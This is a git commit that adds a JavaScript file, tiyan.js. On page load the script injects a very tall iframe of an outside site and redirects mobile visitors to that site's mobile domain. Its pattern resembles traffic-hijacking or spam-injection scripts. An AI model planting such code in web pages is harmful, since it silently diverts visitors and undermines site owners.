bf383f7920854e749ac48ad12b0b0ee98d94fd67
wanggege <909580330@qq.com>
2018-01-27 05:06:42 +0800

    1
    1

---
+++ tiyan.js
@@ -0,0 +1,19 @@
+document.write("<iframe src='http://www.whabl.net/' rel='nofollow' scrolling='no' frameborder='0' width='100%'  height='5256'></iframe>")
+function browserRedirect() { 
+var sUserAgent= navigator.userAgent.toLowerCase(); 
+var bIsIpad= sUserAgent.match(/ipad/i) == "ipad"; 
+var bIsIphoneOs= sUserAgent.match(/iphone os/i) == "iphone os"; 
+var bIsMidp= sUserAgent.match(/midp/i) == "midp"; 
+var bIsUc7= sUserAgent.match(/rv:1.2.3.4/i) == "rv:1.2.3.4"; 
+var bIsUc= sUserAgent.match(/ucweb/i) == "ucweb"; 
+var bIsAndroid= sUserAgent.match(/android/i) == "android"; 
+var bIsCE= sUserAgent.match(/windows ce/i) == "windows ce"; 
+var bIsWM= sUserAgent.match(/windows mobile/i) == "windows mobile"; 
+
+if (bIsIpad || bIsIphoneOs || bIsMidp || bIsUc7 || bIsUc || bIsAndroid || bIsCE || bIsWM) { 
+window.location.href= 'http://wap.whabl.net'; 
+} else { 
+
+} 
+} 
+browserRedirect(); 
